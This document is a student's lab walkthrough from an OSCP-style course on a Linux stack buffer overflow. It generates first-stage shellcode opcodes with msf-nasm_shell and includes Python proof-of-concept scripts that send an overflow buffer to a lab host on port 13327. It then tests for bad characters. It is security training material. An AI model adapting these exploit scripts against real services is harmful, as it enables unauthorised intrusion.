12.5.1.1

# 12.5.1.1.1. Determine the opcodes required to generate a first stage shellcode using msf-nasm_shell.

Since shellcode space is limited, we will create a first stage shellcode. We will align the EAX register so that it points to the buffer right after the "setup sound" string, then jump to that location. This is achieved by using the *ADD* assembly instruction followed by a *JMP* instruction that EAX points to. To get the correct opcodes, use msf-nasm_shell
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/12_linuxBufferOverflow$ msf-nasm_shell 
nasm > add eax,12
00000000  83C00C            add eax,byte +0xc
nasm > jmp eax
00000000  FFE0              jmp eax
nasm > 
```

Update the poc
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/12_linuxBufferOverflow$ cat 4_firstStageShellcode.py 
#!/usr/bin/python
import socket

host = "192.168.214.44"

padding = "\x41" * 4368
eip = "B" * 4
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."

s.connect((host, 13327))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]Payload Sent !"
```

Run the poc
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/12_linuxBufferOverflow$ python 4_firstStageShellcode.py

Follow the ESP in the dump, and we see it points to our first stage shellcode 83c00cffe0

# 12.5.1.1.2. Identify the bad characters that cannot be included in the payload and return address.

**Bad characters CANNOT be in the buffer, return address, or shellcode.**

We cannot check the same way as we did with SyncBreeze. We only have 7 bytes for our first stage shellcode, so we will test 7 characters at a time. That way, we can still see if the EIP points to BBBB. For the purposes of testing for bad characters, we will replace the first stage shellcode values with 7 hex values at a time to test. 

We will start with the string that has values from \x01 to \x07. Here is the script that we will run many times, each time using different characters in the buffer variable (after the eip).
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/12_linuxBufferOverflow$ cat 5_badChars.py 
#!/usr/bin/python
import socket

host = "192.168.214.44"

# Adjust the padding to incorporate the bad chars
padding = "\x41" * 4368
eip = "B" * 4
buffer = "\x11(setup sound " + padding + eip + "\x01\x02\x03\x04\x05\x06\x07" + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."

s.connect((host, 13327))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]Payload Sent !"
```

Start with testing characters: `\x01\x02\x03\x04\x05\x06\x07`
When we right-click on the ESP (bfff:f720) in the register window and 'Follow in Dump', we see that all 7 characters are present at that address. None of these 7 are bad characters.

Continue testing the next 7 characters at a time. When we test string `\x1d\x1e\x1f\x20\x21\x22\x23` we come across a 'Broken pipe fault' error. There is a bad char somewhere in this string.

Test each value in `\x1d\x1e\x1f\x20\x21\x22\x23` individually. For example, let's test just `\x1d`. In the script, we change the buffer variable to:
```python
buffer = "\x11(setup sound " + padding + eip + "\x1d\x1d\x1d\x1d\x1d\x1d\x1d" + "\x90\x00#"
```
When we follow the ESP, we see that it is not a bad character.

However, when we test `\x20` we get the same 'Broken pipe fault' error. `x20` is a bad char.

We continue testing with string `\x21\x22\x23\x24\x25\x26\x27` and see that there are no bad characters.

Continue testing 7 characters at a time until `\xff` has been tested. We find there are only 2 bad characters `\x00\x20`.
